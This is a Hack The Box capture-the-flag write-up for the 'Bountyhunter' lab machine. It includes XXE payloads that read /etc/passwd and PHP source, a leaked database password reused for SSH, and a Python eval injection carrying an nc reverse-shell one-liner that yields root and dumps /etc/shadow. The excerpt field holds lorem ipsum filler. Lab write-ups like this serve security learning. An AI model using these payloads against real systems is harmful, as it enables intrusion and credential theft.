---
layout: single
title: Bountyhunter - Hack The Box
excerpt: "Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum."
date: 2021-08-13
classes: wide
header:
  teaser: /assets/images/htb-writeup-bountyhunter/bountyhunter_logo.png
  teaser_home_page: true
  icon: /assets/images/linux.png
categories:
  - hackthebox
  - infosec
tags:  
  - linux
  - mysql
  - mattermost
  - hashcat
  - rules
---

![](/assets/images/htb-writeup-bountyhunter/bountyhunter_logo.png)

"Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum."

----------------


   ██╗   ██╗███████╗███████╗██████╗
   ██║   ██║██╔════╝██╔════╝██╔══██╗
   ██║   ██║███████╗█████╗  ██████╔╝
   ██║   ██║╚════██║██╔══╝  ██╔══██╗
   ╚██████╔╝███████║███████╗██║  ██║
    ╚═════╝ ╚══════╝╚══════╝╚═╝  ╚═╝


1. [root:/git/htb/bountyhunter]# nmap -Pn -n -sCV 10.10.11.100 --open                                                                (master✱)
  PORT   STATE SERVICE VERSION
  22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
  | ssh-hostkey:
  |   3072 d4:4c:f5:79:9a:79:a3:b0:f1:66:25:52:c9:53:1f:e1 (RSA)
  |   256 a2:1e:67:61:8d:2f:7a:37:a7:ba:3b:51:08:e8:89:a6 (ECDSA)
  |_  256 a5:75:16:d9:69:58:50:4a:14:11:7a:42:c1:b6:23:44 (ED25519)
  80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
  |_http-server-header: Apache/2.4.41 (Ubuntu)
  |_http-title: Bounty Hunters
  Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

DIRB:
==> DIRECTORY: http://10.10.11.100/assets/
==> DIRECTORY: http://10.10.11.100/css/
+ http://10.10.11.100/index.php (CODE:200|SIZE:25169)
==> DIRECTORY: http://10.10.11.100/js/
==> DIRECTORY: http://10.10.11.100/resources/
+ http://10.10.11.100/server-status (CODE:403|SIZE:277)

NIKTO:
+ Server: Apache/2.4.41 (Ubuntu)
+ OSVDB-3093: /db.php: This might be interesting... has been seen in web logs from an unknown scanner.


2. Visiting the webpage we find a Portal tab, press it and we find that portal.php is under development but a test page has
been setup at log_submit.php. Trying to submit a bounty, and capturing the POST in Burp we find that all data are encoded.

POST REQUEST:
  POST /tracker_diRbPr00f314.php HTTP/1.1
  Host: 10.10.11.100
  User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
  Accept: */*
  Accept-Language: en-US,en;q=0.5
  Accept-Encoding: gzip, deflate
  Content-Type: application/x-www-form-urlencoded; charset=UTF-8
  X-Requested-With: XMLHttpRequest
  Content-Length: 227
  Origin: http://10.10.11.100
  Connection: close
  Referer: http://10.10.11.100/log_submit.php

  data=PD94bWwgIHZlcnNpb249IjEuMCIgZW5jb2Rpbmc9IklTTy04ODU5LTEiPz4KCQk8YnVncmVwb3J0PgoJCTx0aXRsZT5UZXN0PC90aXRsZT4KCQk8Y3dlPlRFU1QgQ1dFPC9jd2U%2BCgkJPGN2c3M%2BMTA8L2N2c3M%2BCgkJPHJld2FyZD4xMDAwPC9yZXdhcmQ%2BCgkJPC9idWdyZXBvcnQ%2B

Notice that there are % in the encoded data, this is URL-encoded and below that base64.
So deocde URL -> decode base64 and we are left with our data:

ORIGINAL DATA
  <?xml  version="1.0" encoding="ISO-8859-1"?>
  		<bugreport>
  		<title>Test Title</title>
  		<cwe>TEST CWE</cwe>
  		<cvss>10</cvss>
  		<reward>1000</reward>
  		</bugreport>

We can clearly see that this is XML and should therefore investigate the possibility of XXE attacks.
I usually like to test with a simple Read File XXE POC. Below is the code needed to read /etc/passwd:
  <!--?xml version="1.0" ?-->
  <!DOCTYPE foo [<!ENTITY example SYSTEM "/etc/passwd"> ]>
  <data>&example;</data>

Lets add this to our XML data, base64 encode and then urlencode.

MALICIOUS XXE DATA
<?xml  version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [<!ENTITY example SYSTEM "/etc/passwd"> ]>
		<bugreport>
		<title>&example;</title>
		<cwe>TEST CWE</cwe>
		<cvss>10</cvss>
		<reward>1000</reward>
		</bugreport>

HTTP RESPONSE:
  <td>Title:</td>
  <td>root:x:0:0:root:/root:/bin/bash
  daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
  bin:x:2:2:bin:/bin:/usr/sbin/nologin
  sys:x:3:3:sys:/dev:/usr/sbin/nologin
  sync:x:4:65534:sync:/bin:/bin/sync
  games:x:5:60:games:/usr/games:/usr/sbin/nologin
  man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
  lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
  mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
  news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
  uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
  proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
  www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
  backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
  list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
  irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
  gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
  nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
  systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
  systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
  systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
  messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
  syslog:x:104:110::/home/syslog:/usr/sbin/nologin
  _apt:x:105:65534::/nonexistent:/usr/sbin/nologin
  tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
  uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
  tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
  landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
  pollinate:x:110:1::/var/cache/pollinate:/bin/false
  sshd:x:111:65534::/run/sshd:/usr/sbin/nologin
  systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
  development:x:1000:1000:Development:/home/development:/bin/bash
  lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
  usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
  </td>

It works as intended, we have file read!


3. As usual with LFI's we need to find the right file. Scavenging through different known sensitive files gives nothing, so my next
thought was to go through web-files - but we don't know the absolute path..

After some googling I found that you're able to extract files from the folder you are in, using following output:
  <!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>

So with this knowledge we can try and grab 'db.php' that we found previously and hope to find any db creds and password reuse.

MALICIOUS PAYLOAD:
<?xml  version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=db.php"> ]>
		<bugreport>
		<title>&xxe;</title>
		<cwe>TEST CWE</cwe>
		<cvss>10</cvss>
		<reward>1000</reward>
		</bugreport>

As before, base64 encode and then urlencode. Sending the data and we get a reply with:
PD9waHAKLy8gVE9ETyAtPiBJbXBsZW1lbnQgbG9naW4gc3lzdGVtIHdpdGggdGhlIGRhdGFiYXNlLgokZGJzZXJ2ZXIgPSAibG9jYWxob3N0IjsKJGRibmFtZSA9ICJib3VudHkiOwokZGJ1c2VybmFtZSA9ICJhZG1pbiI7CiRkYnBhc3N3b3JkID0gIm0xOVJvQVUwaFA0MUExc1RzcTZLIjsKJHRlc3R1c2VyID0gInRlc3QiOwo/Pgo=

Decoding it:
<?php
// TODO -> Implement login system with the database.
$dbserver = "localhost";
$dbname = "bounty";
$dbusername = "admin";
$dbpassword = "m19RoAU0hP41A1sTsq6K";
$testuser = "test";
?>

YES SOME CREDS! From grabbing /etc/passwd earlier we saw that user development was present.

[root:/git/htb/bountyhunter]# ssh development@bountyhunter.htb
development@bountyhunter.htb's password: m19RoAU0hP41A1sTsq6K
  Last login: Wed Jul 21 12:04:13 2021 from 10.10.14.8
  development@bountyhunter:~$ id && hostname
    uid=1000(development) gid=1000(development) groups=1000(development)
    bountyhunter
  development@bountyhunter:~$ cat user.txt
    d3ff041dcea82a5839bbfa0e7d75a80f



██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████

   ██████╗  ██████╗  ██████╗ ████████╗
   ██╔══██╗██╔═══██╗██╔═══██╗╚══██╔══╝
   ██████╔╝██║   ██║██║   ██║   ██║
   ██╔══██╗██║   ██║██║   ██║   ██║
   ██║  ██║╚██████╔╝╚██████╔╝   ██║
   ╚═╝  ╚═╝ ╚═════╝  ╚═════╝    ╚═╝


1. In /home/development we find a file, contract.txt:
  development@bountyhunter:~$ cat contract.txt
    Hey team,

    I'll be out of the office this week but please make sure that our contract with Skytrain Inc gets completed.

    This has been our first job since the "rm -rf" incident and we can't mess this up. Whenever one of you gets on please have a look at the internal tool they sent over. There have been a handful of tickets submitted that have been failing validation and I need you to figure out why.

    I set up the permissions for you to test this. Good luck.

    -- John

  development@bountyhunter:/opt/skytrain_inc/invalid_tickets$ sudo -l
    Matching Defaults entries for development on bountyhunter:
        env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

    User development may run the following commands on bountyhunter:
        (root) NOPASSWD: /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py

Looking at the script:
  development@bountyhunter:/dev/shm$ cat /opt/skytrain_inc/ticketValidator.py
    #Skytrain Inc Ticket Validation System 0.1
    #Do not distribute this file.

    def load_file(loc):
        if loc.endswith(".md"):
            return open(loc, 'r')
        else:
            print("Wrong file type.")
            exit()

    def evaluate(ticketFile):
        #Evaluates a ticket to check for ireggularities.
        code_line = None
        for i,x in enumerate(ticketFile.readlines()):
            if i == 0:
                if not x.startswith("# Skytrain Inc"):
                    return False
                continue
            if i == 1:
                if not x.startswith("## Ticket to "):
                    return False
                print(f"Destination: {' '.join(x.strip().split(' ')[3:])}")
                continue

            if x.startswith("__Ticket Code:__"):
                code_line = i+1
                continue

            if code_line and i == code_line:
                if not x.startswith("**"):
                    return False
                ticketCode = x.replace("**", "").split("+")[0]
                if int(ticketCode) % 7 == 4:
                    validationNumber = eval(x.replace("**", ""))
                    if validationNumber > 100:
                        return True
                    else:
                        return False
        return False

    def main():
        fileName = input("Please enter the path to the ticket file.\n")
        ticket = load_file(fileName)
        #DEBUG print(ticket)
        result = evaluate(ticket)
        if (result):
            print("Valid ticket.")
        else:
            print("Invalid ticket.")
        ticket.close

    main()

In the script we can find an obvious vulnerable eval-function on line 34.
Looking through the script there are a few pointers that need to be met.
1. Ticket file ends with .md
2. Content of ticket file starts with '# Skytrain Inc'
3. Line two starts with '## Ticket to '
4. Third line '__Ticket Code:__' - notice the capital T and C.
5. The calculation should in the end yield mod 7 = 4. (11+321+1 mod 7 = 4)

Below is a valid ticket.
[root:/git/htb/bountyhunter]# cat 600939065.md                                                                                    (master✱)
  # Skytrain Inc
  ## Ticket to Essex
  __Ticket Code:__
  **11+321+1**
  ##Issued: 2021/05/12
  #End Ticket

[root:/git/htb/bountyhunter]# python3 exp.py                                                                                      (master✱)
  Please enter the path to the ticket file.
  600939065.md
  Destination: Essex
  Valid ticket.


2. If I'm understanding correct, the calculations are passed to the eval-function. Instead of the calculation, we should be
able to inject python code and from there get code execution / reverse shell - as long as mod 7 = 4.

development@bountyhunter:/opt/skytrain_inc$ cat /dev/shm/ticket.md
  # Skytrain Inc
  ## Ticket to Root
  __Ticket Code:__
  **11+__import__('os').system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.4 4488 >/tmp/f')
  ##Issued: 2021/05/12
  #End Ticket

development@bountyhunter:/opt/skytrain_inc$ sudo /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py
  Please enter the path to the ticket file.
  /dev/shm/ticket.md
  Destination: Root
  rm: cannot remove '/tmp/f': No such file or directory

[root:/git/htb/bountyhunter]# nc -lvnp 4488                                                                                       (master✱)
  listening on [any] 4488 ...
  connect to [10.10.14.4] from (UNKNOWN) [10.10.11.100] 49774
  # id
    uid=0(root) gid=0(root) groups=0(root)
  # cat /root/root.txt
    65d583629b3a54070bb6b26f1f08915f

  # cat /etc/shadow
    root:$6$S6D08T6aUYoEjKkH$aL7HVCr1HUlObuXmxFaXrmYgO3Bn0DwYnefBPI/ATF/At/0eplm9xBfsRoFo8NnlWFeIBzmBivxSfFtAUyfp9.:18793:0:99999:7:::
    development:$6$Icvq5CG9C3uVjeoJ$OCBFhlmlWWblwxPMj.LjvpuV49flCSkTiszqThdLwJ.eqWtOSgSAhjRXAzQTnQyn0tuYlYyQPbqupz4Jq85wM/:18793:0:99999:7:::



██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████

   ██╗███╗   ██╗███████╗ ██████╗ ██████╗ ███╗   ███╗ █████╗ ████████╗██╗ ██████╗ ███╗   ██╗
   ██║████╗  ██║██╔════╝██╔═══██╗██╔══██╗████╗ ████║██╔══██╗╚══██╔══╝██║██╔═══██╗████╗  ██║
   ██║██╔██╗ ██║█████╗  ██║   ██║██████╔╝██╔████╔██║███████║   ██║   ██║██║   ██║██╔██╗ ██║
   ██║██║╚██╗██║██╔══╝  ██║   ██║██╔══██╗██║╚██╔╝██║██╔══██║   ██║   ██║██║   ██║██║╚██╗██║
   ██║██║ ╚████║██║     ╚██████╔╝██║  ██║██║ ╚═╝ ██║██║  ██║   ██║   ██║╚██████╔╝██║ ╚████║
   ╚═╝╚═╝  ╚═══╝╚═╝      ╚═════╝ ╚═╝  ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝   ╚═╝   ╚═╝ ╚═════╝ ╚═╝  ╚═══╝


XXE Read File:
  https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity#main-attacks

XXE PHP Wrappers:
  https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity#utf-7
